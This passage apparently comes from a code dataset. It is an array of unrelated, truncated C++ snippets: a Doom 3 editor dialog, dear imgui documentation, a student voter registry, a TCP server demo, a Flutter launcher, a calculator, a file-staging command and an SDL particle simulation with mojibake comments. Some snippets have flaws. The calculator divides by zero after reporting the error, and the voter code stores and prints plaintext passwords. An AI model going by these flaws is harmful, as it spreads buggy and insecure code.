IDC_EDIT_ANCHOR_Z, \"anchor z-coordinate\" },\n\t{ IDC_RADIO_HINGE_AXIS_BONE, \"use a bone for the hinge axis\" },\n\t{ IDC_RADIO_HINGE_AXIS_ANGLES, \"use angles to set the orientation of the hinge axis\" },\n\t{ IDC_COMBO_HINGE_AXIS_JOINT1, \"bone start joint\" },\n\t{ IDC_COMBO_HINGE_AXIS_JOINT2, \"bone end joint\" },\n\t{ IDC_EDIT_HINGE_AXIS_PITCH, \"pitch angle\" },\n\t{ IDC_EDIT_HINGE_AXIS_YAW, \"yaw angle\" },\n\t{ IDC_RADIO_HINGE_LIMIT_NONE, \"no limit\" },\n\t{ IDC_RADIO_HINGE_LIMIT_ANGLES, \"angle limit\" },\n\t{ IDC_EDIT_HINGE_LIMIT_ANGLE1, \"limit orientation\" },\n\t{ IDC_EDIT_HINGE_LIMIT_ANGLE2, \"limit width\" },\n\t{ IDC_EDIT_HINGE_LIMIT_ANGLE3, \"limit angle\" },\n\t{ 0, NULL }\n};\n\nIMPLEMENT_DYNAMIC(DialogAFConstraintHinge, CDialog)\n\n/*\n================\nDialogAFConstraintHinge::DialogAFConstraintHinge\n================\n*/\nDialogAFConstraintHinge::DialogAFConstraintHinge(CWnd* pParent /*=NULL*/)\n\t: CDialog(DialogAFConstraintHinge::IDD, pParent)\n\t, m_anchor_x(0)\n\t, m_anchor_y(0)\n\t, m_anchor_z(0)\n\t, m_axisPitch(0)\n\t, m_axisYaw(0)\n\t, m_limitAngle1(0)\n\t, m_limitAngle2(30.0f)\n\t, m_limitAngle3(0)\n\t, constraint(NULL)\n\t, file(NULL)\n{\n\tCreate( IDD_DIALOG_AF_CONSTRAINT_HINGE, pParent );\n\tEnableToolTips( TRUE );\n}\n\n/*\n================\nDialogAFConstraintHinge::~DialogAFConstraintHinge\n================\n*/\nDialogAFConstraintHinge::~DialogAFConstraintHinge() {\n}\n\n/*\n================\nDialogAFConstraintHinge::DoDataExchange\n================\n*/\nvoid DialogAFConstraintHinge::DoDataExchange(CDataExchange* pDX) {\n\tCDialog::DoDataExchange(pDX);\n\t//{{AFX_DATA_MAP(DialogAFConstraintHinge)\n\tDDX_Control(pDX, IDC_COMBO_ANCHOR_JOINT, m_comboAnchorJoint);\n\tDDX_Text(pDX, IDC_EDIT_ANCHOR_X, m_anchor_x);\n\tDDX_Text(pDX, IDC_EDIT_ANCHOR_Y, m_anchor_y);\n\tDDX_Text(pDX, IDC_EDIT_ANCHOR_Z, m_anchor_z);\n\tDDX_Control(pDX, IDC_COMBO_HINGE_AXIS_JOINT1, m_comboAxisJoint1);\n\tDDX_Control(pDX, IDC_COMBO_HINGE_AXIS_JOINT2, m_comboAxisJoint2);\n\tDDX_Text(pDX, IDC_EDIT_HINGE_AXIS_PITCH, m_axisPitch);\n\tDDX_Text(pDX, IDC_EDIT_HINGE_AXIS_YAW, m_axisYaw);\n\tDDX_Text(pDX, IDC_EDIT_HINGE_LIMIT_ANGLE1, m_limitAngle1);\n\tDDX_Text(pDX, IDC_EDIT_HINGE_LIMIT_ANGLE2, m_limitAngle2);\n\tDDX_Text(pDX, IDC_EDIT_HINGE_LIMIT_ANGLE3, m_limitAngle3);\n\t//}}AFX_DATA_MAP\n}\n\n/*\n================\nDialogAFConstraintHinge::InitJointLists\n================\n*/\nvoid DialogAFConstraintHinge::InitJointLists( void ) {\n\tm_comboAnchorJoint.ResetContent();\n\tm_comboAxisJoint1.ResetContent();\n\tm_comboAxisJoint2.ResetContent();\n\n\tif ( !file ) {\n\t\treturn;\n\t}\n\n\tconst idRenderModel *model = gameEdit->ANIM_GetModelFromName( file->model );\n\tif ( !model ) {\n\t\treturn;\n\t}\n\n\tint numJoints = model->NumJoints();\n\tfor ( int i = 0; i < numJoints; i++ ) {\n\t\tconst char *jointName = model->GetJointName( (jointHandle_t) i );\n\t\tm_comboAnchorJoint.AddString( jointName );\n\t\tm_comboAxisJoint1.AddString( jointName );\n\t\tm_comboAxisJoint2.AddString( jointName );\n\t}\n}\n\n/*\n================\nDialogAFConstraintHinge::LoadFile\n================\n*/\nv",
    "// dear imgui, v1.83 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/3793 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n// - Discussions           https://github.com/ocornut/imgui/discussions\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.\n - TAB/SHIFT+TAB to cycle through keyboard editable fields.\n - CTRL+Click on a slider or drag box to input value as text.\n - Use mouse wheel to scroll.\n ",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <cstring>\r\n#include <conio.h>\r\n#include<fstream>\r\nusing namespace std;\r\n\r\nclass Voter {\r\nprotected:\r\n\tstruct Node {\r\n\t\tchar name[40];\r\n\t\tchar number[12];\r\n\t\tchar password[4];\r\n\t\tint hasVoted;\r\n\t\tNode* left;\r\n\t\tNode* right;\r\n\t};\r\n\tNode* root;\r\n\tchar n[40];\r\n\tchar num[12];\r\n\tchar pass[4];\r\n\tint hvt;\r\n\r\n\r\n\tNode* insertNode(char* name, char* num, char* password,int HasVoted, Node* root ) {\r\n\t\tif (root == NULL) {\r\n\t\t\troot = new Node();\r\n\t\t\tstrcpy_s(root->name, name);\r\n\t\t\tstrcpy_s(root->number, num);\r\n\t\t\tstrcpy_s(root->password, password);\r\n\t\t\troot->hasVoted = HasVoted;\r\n\t\t\troot->left = root->right = NULL;\r\n\t\t\treturn root;\r\n\t\t}\r\n\t\telse if (strcmp(root->name, name) == 0) {\r\n\t\t\tcout << \"Name is Already Present \" << endl;\r\n\t\t\treturn NULL;\r\n\t\t}\r\n\t\telse if (strcmp(root->name, name) > 0) {\r\n\t\t\troot->left = insertNode(name, num, password, HasVoted, root->left);\r\n\t\t}\r\n\t\telse {\r\n\t\t\troot->right = insertNode(name, num, password, HasVoted, root->right);  // Change this line\r\n\t\t}\r\n\t\treturn root;\r\n\t}\r\n\r\n\tNode* inorderPre(Node* node) {\r\n\t\twhile (node->right != nullptr)\r\n\t\t\tnode = node->right;\r\n\r\n\t\treturn node;\r\n\t}\r\n\r\n\tNode* deleteNode(Node* root, char* name, char* pass) {\r\n\t\tif (root == nullptr)\r\n\t\t{\r\n\t\t\treturn root;\r\n\t\t}\r\n\r\n\t\tif (strcmp(root->name, name ) > 0 && strcmp(root->password, pass) > 0 )\r\n\t\t{\r\n\t\t\troot->left = deleteNode(root->left, name, pass);\r\n\t\t}\r\n\t\telse if (strcmp(root->name, name) < 0 && strcmp(root->password, pass) < 0)\r\n\t\t{\r\n\t\t\troot->right = deleteNode(root->right, name, pass);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tif (root->left == nullptr) {\r\n\t\t\t\tNode* temp = root->right;\r\n\t\t\t\tcout << \"Name : \" << root->name << endl;\r\n\t\t\t\tcout << \"Phone Number : \" << root->number << endl;\r\n\t\t\t\tdelete root;\r\n\t\t\t\tcout << \"Candidate deleted successfully.\" << endl;\r\n\t\t\t\treturn temp;\r\n\t\t\t}\r\n\t\t\telse if (root->right == nullptr) {\r\n\t\t\t\tNode* temp = root->left;\r\n\t\t\t\tcout << \"Name : \" << root->name << endl;\r\n\t\t\t\tcout << \"Phone Number : \" << root->number << endl;\r\n\t\t\t\tdelete root;\r\n\t\t\t\tcout << \"Candidate deleted successfully.\" << endl;\r\n\t\t\t\treturn temp;\r\n\t\t\t}\r\n\r\n\t\t\tNode* temp = inorderPre(root->left);\r\n\t\t\tstrcpy_s(root->name, temp->name);\r\n\t\t\troot->left = deleteNode(root->left, temp->name,temp->password);\r\n\t\t}\r\n\t\treturn root;\r\n\t}\r\n\r\n\tvoid searchNode(Node* root, char* name, char* pass) {\r\n\t\tif (root != nullptr) {\r\n\t\t\tsearchNode(root->left, name, pass);\r\n\t\t\tif (strcmp(root->name, name) == 0 && strcmp(root->password, pass) == 0) {\r\n\t\t\t\tcout << \" Name : \" << root->name << \" , Phone No.: \" << root->number << endl;\r\n\t\t\t}\r\n\t\t\tsearchNode(root->right, name, pass);\r\n\t\t}\r\n\t}\r\n\r\n\tNode* updateNode(Node* root, const char* name) {\r\n\t\tif (root != nullptr) {\r\n\t\t\tif (strcmp(root->name, name) == 0) {\r\n\t\t\t\tchar newName[40];\r\n\t\t\t\tchar newNumber[12];\r\n\t\t\t\tchar newPass[4];\r\n\t\t\t\tchar ch;\r\n\t\t\t\tcout << \"Enter what you want to update name or phone number press 'N' for name and 'P' for  phone number and 'd' for password..\";\r\n\t\t\t\tcin >> ch;\r\n\t\t\t\twhile (ch == 'p' || ch == 'P' || ch == 'n' || ch == 'N' || ch == 'd' || ch == 'D') {\r\n\t\t\t\t\tif (ch == 'n' || ch == 'N') {\r\n\t\t\t\t\t\tcout << \"Enter new Name: \";\r\n\t\t\t\t\t\tcin.ignore();\r\n\t\t\t\t\t\tcin.getline(newName, 40);\r\n\t\t\t\t\t\tstrcpy_s(root->name, newName);\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if (ch == 'p' || ch == 'P') {\r\n\t\t\t\t\t\tcout << \"Enter new Phone no.: \";\r\n\t\t\t\t\t\tcin.ignore();\r\n\t\t\t\t\t\tcin.getline(newNumber, 12);\r\n\t\t\t\t\t\tstrcpy_s(root->number, newNumber);\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if (ch == 'd' || ch == 'D') {\r\n\t\t\t\t\t\tcout << \"Enter new password.: \";\r\n\t\t\t\t\t\tcin.ignore();\r\n\t\t\t\t\t\tcin.getline(newPass, 4);\r\n\t\t\t\t\t\tstrcpy_s(root->password, newPass);\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tcout << \"Voter updated successfully.\" << endl;\r\n\t\t\t\treturn root;\r\n\t\t\t}\r\n\r\n\t\t\troot->left = updateNode(root->left, name);\r\n\t\t\troot->right = updateNode(root->right, name);\r\n\t\t}\r\n\t\treturn root;\r\n\t}\r\n\r\n\tvoid aOrder(Node* root) {\r\n\t\tif (root != nullptr) {\r\n\t\t\taOrder(root->left);\r\n\t\t\tcout << \" Name : \" << root->name << endl << \" Phone No.: \" << root->number << endl << \" password .: \" << root->password  << endl;\r\n\t\t\taOrder(root->right);\r\n\t\t}\r\n\t}\r\n\r\n\tvoid writeBSTToFile(Node* root, ofstream& outFile) {\r\n\t\tif (root == nullptr) {\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\toutFile << root->name << \"\\t\" << root->number << \"\\t\" << root->password << \"\\t\" << root->hasVoted << endl;\r\n\t\twriteBSTToFile(root->left, outFile);\r\n\t\twriteBSTToFile(root->right, outFile);\r\n\t}\r\n\r\n\tvoid LoadBSTFile(ifstream& inFile) {\r\n\t\troot = NULL;\r\n\t\tNode* temproot = NULL;\r\n\t\t// Create a BST and insert data from the file\r\n\t\twhile (inFile >> n >> num >> pass >> hvt) {\r\n\t\t\ttemproot = insertNode(n, num, pass, hvt, temproot);\r\n\t\t}\r\n\t\troot = temproot;\r\n\t}\r\n\r\npublic:\r\n\tVoter() {\r\n\t\troot = NULL;\r\n\t}\r\n\r\n\tNode* getRoot() {\r\n\t\treturn root;\r\n\t}\r\n\r\n\tint getHasVote(Node*root,char*name,char*pass) {\r\n\t\tNode* pp = findVoter(root, name, pass);\r\n\t\tif (pp->hasVoted == 1) {\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t\telse {\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t}\r\n\t\r\n\tvoid insertVoter() {\r\n\t\tcout << \"Enter Voter Name : \";\r\n\t\tcin.ignore();\r\n\t\tci",
    "#include <simple_socket.hpp>\r\n#include <iostream>\r\n\r\n#define DEFAULT_IP                                      \"localhost\"\r\n#define DEFAULT_PORT                                \"1234\"\r\n#define DEFAULT_PROTOCOL_FAMILY     AF_UNSPEC\r\n#define DEFAULT_BACKLOG                         SOMAXCONN\r\n\r\n#define DEFAULT_RECV_MSG_LEN             255\r\n\r\nint main(int argc, char* argv[]) {\r\n    kani::TcpServerSocketInfo info;\r\n    info.m_node = DEFAULT_IP;\r\n    info.m_service = DEFAULT_PORT;\r\n    info.m_protocolFamily = DEFAULT_PROTOCOL_FAMILY;\r\n    info.m_backlog = DEFAULT_BACKLOG;\r\n\r\n    kani::TcpServer server(info);\r\n\r\n    if (!server.is_valid()) {\r\n        std::cerr << \"can't initialized server!\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    if (server.start() != kani::SS_START_RESULT_SUCCESS) {\r\n        std::cerr << \"can't start the server!\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    kani::TcpNetClient client;\r\n    std::cout << \"waiting for client...\" << std::endl;\r\n\r\n    while (!server.wait_client(&client)) { }\r\n\r\n    std::cout << \"client ( \" << client.get_ip() << \" : \" << client.get_port() << \" ) connected!\" << std::endl;\r\n\r\n    kani::SendMsg msg;\r\n    msg.m_msg = \"Hello, client! I'm a server. Welcome to my simple server 8)\";\r\n\r\n    if (!server.send_msg(&client, &msg)) {\r\n        std::cerr << \"can't sent message to client!\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    std::cout << \"sent message to client: \" << msg.m_sentLen << \"byte\" << std::endl;\r\n\r\n    kani::RecvMsg response(DEFAULT_RECV_MSG_LEN);\r\n\r\n    if (!server.recv_msg(&client, &response)) {\r\n        std::cerr << \"can't received message from client!\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    std::cout << \"received message from client: \" << response.m_recvLen << \"byte\" << std::endl;\r\n    std::cout << \"Client: \" << response.m_msg << std::endl;\r\n\r\n    std::cout << \"Perfect! Now, say to goodbye :')\" << std::endl;\r\n    client.disconnect();\r\n\r\n    std::cout << \"stopping the server...\" << std::endl;\r\n    server.stop();\r\n\r\n    std::cout << \"server stopped\" << std::endl;\r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_bloc_test_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    char op;\r\n    double num1,num2;\r\n\r\n    cout<<\"Enter operator(+,-,*,/):\";\r\n    cin>>op;\r\n    cout<<\"Enter two numbers:\";\r\n    cin>>num1>>num2;\r\n\r\n    switch(op)\r\n    {\r\n        case'+':\r\n        cout<<num1<<\"+\"<<num2<<\"=\"<<num1+num2;\r\n        cout<<\"     Addition of two numbers : \"<<num1+num2;\r\n        break;\r\n\r\n        case'-':\r\n        cout<<num1<<\"-\"<<num2<<\"=\"<<num1-num2;\r\n        cout<<\"     Subtraction of two numbers : \"<<num1-num2;\r\n        break;\r\n\r\n        case'*':\r\n        cout<<num1<<\"*\"<<num2<<\"=\"<<num1*num2;\r\n        cout<<\"     Multiplication of two numbers : \"<<num1*num2;\r\n\t\tbreak;\r\n\r\n        case'/':\r\n          if(num2!=0)\r\n        cout<<num1<<\"/\"<<num2<<\"/\"<<num1/num2;\r\n          else\r\n          cout<<\"Error! Division by zero!\";\r\n          cout<<\"   Division of two numbers : \"<<num1/num2;\r\n          break;\r\n\r\n          default:\r\n\r\n          cout<<\"Invalid operator!\";\r\n          break;\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"add.h\"\n\nnamespace Commands {\n\tvoid Add::exec() {\n\t\t// Get path to staging folder\n\t\tstd::filesystem::path staging_dir = get_svc_dir();\n\t\tif (staging_dir.empty()) {\n\t\t\tERR(std::filesystem::current_path().string() << \" is not being tracked.\");\n\t\t\tSEE_HELP(init)\n\t\t\treturn;\n\t\t}\n\t\tstaging_dir = staging_dir / \"staging\";\n\t\tauto parent_dir = staging_dir.parent_path().parent_path();\n\n\t\t// There should be at least 1 arg for location\n\t\tif (this->parser->is_parsed()) {\n\t\t\tERR(\"Usage: svc add <loc1> <loc2> ...\")\n\t\t\treturn;\n\t\t}\n\n\t\tauto copy_ops = std::filesystem::copy_options::overwrite_existing | std::filesystem::copy_options::recursive;\n\t\twhile (!this->parser->is_parsed()) {\n\t\t\tstd::string loc = this->parser->match_arg();\n\n\t\t\tif (!std::filesystem::exists(loc)) {\n\t\t\t\tstd::cout << loc << \" does not exist.\\n\";\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tstd::filesystem::path loc_path = std::filesystem::canonical(loc);\n\t\t\tif (parent_dir.string().size() > loc_path.string().size()) {\n\t\t\t\tstd::cout << \"Cannot add files outside of directory. (\" << loc << \")\\n\";\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\t// Ignore SVC_DIR\n\t\t\tif (loc_path == staging_dir.parent_path() || loc_path.filename() == \".git\") continue;\n\n\t\t\tstd::filesystem::path dir = loc_path.string().size() == parent_dir.string().size() ? staging_dir / \"\" : \n\t\t\t\tstaging_dir / loc_path.string().substr(parent_dir.string().size() + 1);\n\n\t\t\tif (std::filesystem::is_directory(loc_path)) {\n\t\t\t\tstd::filesystem::create_directories(dir);\n\t\t\t\tfor (auto& entry : std::filesystem::directory_iterator(loc_path)) {\n\t\t\t\t\tif (entry.path() == staging_dir.parent_path()  || entry.path().filename() == \".git\") continue;\n\t\t\t\t\tstd::filesystem::remove(dir / entry.path().filename());\n\t\t\t\t\tstd::filesystem::copy(entry.path(), dir / entry.path().filename(), copy_ops);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tstd::filesystem::remove(dir);\n\t\t\t\tstd::filesystem::copy(loc_path, dir, copy_ops);\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid Add::help() {\n\t\tstd::cout << \"add\\n\";\n\t\tstd::cout << \"Description: Add files and directories to have changes committed to next version.\\n\";\n\t\tstd::cout << \"Usage: svc add <loc1> <loc2> ...\\n\";\n\t\tstd::cout << \"Params:\\n\\tloc<n>: File/directory to track\\n\";\n\t}\n}",
    "\r\n#include <SDL.h>\r\n#include <vector>\r\n#include <cmath>\r\n#include <iostream>\r\n#include <random>\r\n#include <string>\r\n#include <algorithm>\r\n\r\n// \u00cd\u00e0\u00f1\u00f2\u00f0\u00ee\u00e9\u00ea\u00e8\r\nconst int WIDTH = 1920;\r\nconst int HEIGHT = 1080;\r\nconst int FPS = 6000;\r\nconst float PARTICLE_RADIUS = 10.0f;\r\nconst float GRAVITY = 0.0981f;\r\nconst float REST_DENSITY = 0.01f;\r\nconst float GAS_CONSTANT = 0.95f;\r\nconst float VISCOSITY = 0.9f;\r\nconst int PARTICLE_CREATION_RATE = 10;\r\nconst float COHESION_STRENGTH = 0.0f;\r\nconst float DAMPING = 0.99f;\r\nconst float DRAG_COEFFICIENT = 0.1f;\r\nconst int GRAB_RADIUS = 100;\r\nconst float SPRING_CONSTANT = 0.25f;\r\nconst int MAX_PARTICLES = 150000; // \u00ce\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e5\u00ed\u00e8\u00e5 \u00ed\u00e0 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f7\u00e0\u00f1\u00f2\u00e8\u00f6\r\n\r\n// \u00cf\u00f0\u00e5\u00ef\u00ff\u00f2\u00f1\u00f2\u00e2\u00e8\u00e5 (\u00f2\u00e5\u00ef\u00e5\u00f0\u00fc \u00f1\u00f4\u00e5\u00f0\u00e0)\r\nconst float OBSTACLE_X = 400.0f;\r\nconst float OBSTACLE_Y = 300.0f;\r\nconst float OBSTACLE_Z = 200.0f;\r\nconst float OBSTACLE_RADIUS = 100.0f;\r\n\r\n// \u00d1\u00f2\u00e5\u00ed\u00fb (\u00f2\u00e5\u00ef\u00e5\u00f0\u00fc \u00ee\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e8\u00e2\u00e0\u00fe\u00f9\u00e8\u00e9 \u00ea\u00f3\u00e1)\r\nconst float WALL_THICKNESS = 0.0f;\r\nconst SDL_Color WALL_COLOR = { 255, 255, 255, 255 };\r\nconst float PAD_X = 20.0f;\r\nconst float PAD_Y = 20.0f;\r\nconst float PAD_Z = 20.0f;\r\n\r\n// \u00c3\u00f0\u00e0\u00e4\u00e8\u00e5\u00ed\u00f2 \u00f6\u00e2\u00e5\u00f2\u00ee\u00e2\r\nconst int GRADIENT_STEPS = 256;\r\nSDL_Color color_gradient[GRADIENT_STEPS];\r\nconst float max_speed = 25.0f;\r\n\r\n// \u00d3\u00e3\u00eb\u00fb \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb\r\nfloat cameraYaw = 0.0f; // \u00cf\u00ee\u00e2\u00ee\u00f0\u00ee\u00f2 \u00e2\u00ee\u00ea\u00f0\u00f3\u00e3 \u00ee\u00f1\u00e8 Y\r\nfloat cameraPitch = 0.0f; // \u00cd\u00e0\u00ea\u00eb\u00ee\u00ed \u00e2\u00e2\u00e5\u00f0\u00f5/\u00e2\u00ed\u00e8\u00e7\r\n\r\n// \u00cf\u00ee\u00e7\u00e8\u00f6\u00e8\u00ff \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb\r\nfloat cameraX = 0.0f;\r\nfloat cameraY = 0.0f;\r\nfloat cameraZ = 0.0f;\r\n\r\n// \u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00ff \u00e4\u00eb\u00ff \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00ff \u00e3\u00f0\u00e0\u00e4\u00e8\u00e5\u00ed\u00f2\u00e0 \u00f6\u00e2\u00e5\u00f2\u00ee\u00e2 (\u00ed\u00e5 \u00e8\u00e7\u00ec\u00e5\u00ed\u00e8\u00eb\u00e0\u00f1\u00fc)\r\nvoid create_gradient(SDL_Color color1, SDL_Color color2, int steps, SDL_Color* gradient) {\r\n    for (int i = 0; i < steps; ++i) {\r\n        float t = i / (steps - 1.0f);\r\n        gradient[i].r = static_cast<Uint8>(color1.r * (1 - t) + color2.r * t);\r\n        gradient[i].g = static_cast<Uint8>(color1.g * (1 - t) + color2.g * t);\r\n        gradient[i].b = static_cast<Uint8>(color1.b * (1 - t) + color2.b * t);\r\n        gradient[i].a = 255;\r\n    }\r\n}\r\n\r\n// \u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00ff \u00e4\u00eb\u00ff \u00f0\u00e8\u00f1\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff \u00e7\u00e0\u00ef\u00ee\u00eb\u00ed\u00e5\u00ed\u00ed\u00ee\u00e3\u00ee \u00ea\u00f0\u00f3\u00e3\u00e0 (\u00f2\u00e5\u00ef\u00e5\u00f0\u00fc \u00f0\u00e8\u00f1\u00f3\u00e5\u00f2 \u00f1 \u00f3\u00f7\u00e5\u00f2\u00ee\u00ec \u00ef\u00e5\u00f0\u00f1\u00ef\u00e5\u00ea\u00f2\u00e8\u00e2\u00fb, \u00f3\u00e3\u00eb\u00ee\u00e2 \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb \u00e8 \u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb)\r\nvoid filledCircleRGBA(SDL_Renderer* renderer, float x, float y, float z, float radius, Uint8 r, Uint8 g, Uint8 b, Uint8 a) {\r\n    // \u00cf\u00f0\u00e8\u00ec\u00e5\u00ed\u00e5\u00ed\u00e8\u00e5 \u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00ea\u00e0\u00ec\u00e5\u00f0\u00fb\r\n    x -= cameraX;\r\n    y -= cameraY;\r\n    z -= cameraZ;\r\n\r\n    // \u00cf\u00ee\u00e2\u00ee\u00f0\u00ee\u00f2 \u00e2\u00ee\u00ea\u00f0\u00f3\u00e3 \u00ee\u00f1\u00e8 Y (Yaw)\r\n    float rotatedX = x * cos(cameraYaw) - z * sin(cameraYaw);\r\n    float rotatedZ = x * sin(cameraYaw) + z * cos(cameraYaw);\r\n\r\n    // \u00cd\u00e0\u00ea\u00eb\u00ee\u00ed \u00e2\u00e2\u00e5\u00f0\u00f5/\u00e2\u00ed\u00e8\u00e7 (Pitch) - \u00ed\u00e5 \u00f0\u00e5\u00e0\u00eb\u00e8\u00e7\u00ee\u00e2\u00e0\u00ed, \u00f2\u00f0\u00e5\u00e1\u00f3\u00e5\u00f2 \u00e1\u00ee\u00eb\u00e5\u00e5 \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00e9 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00fb 